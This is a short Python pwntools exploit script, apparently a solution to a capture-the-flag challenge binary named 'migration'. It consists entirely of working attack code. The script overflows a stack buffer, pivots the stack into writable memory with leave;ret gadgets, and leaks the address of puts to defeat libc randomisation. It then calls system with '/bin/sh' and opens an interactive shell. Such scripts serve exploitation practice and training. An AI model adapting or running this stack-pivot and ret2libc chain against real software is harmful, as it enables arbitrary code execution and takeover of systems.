from pwn import *

p = process("./migration")
# p = gdb.debug("./migration", "b main")
elf = ELF("./migration")
# libc = ELF("/usr/lib32/libc-2.31.so")
libc = elf.libc

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
buf1 = 0x0804b000 - 0x200
buf2 = 0x0804b000 - 0x100
leave_ret = 0x08048418
pop_edx = 0x0804836d
junk = b'a' * 40

p.recv()
payload1 = junk + p32(buf1) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf1) + p32(100)
p.send(payload1)

payload2 = p32(buf2) + p32(puts_plt) + p32(pop_edx) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf2) + p32(0x100)
p.sendline(payload2)
sleep(0.1)
puts = u32(p.recv(4))
libc_base = puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
sh = libc_base + next(libc.search(b"/bin/sh"))

payload3 = p32(buf1) + p32(system) + p32(0xdeadbeef) + p32(sh)
p.sendline(payload3)

p.interactive()
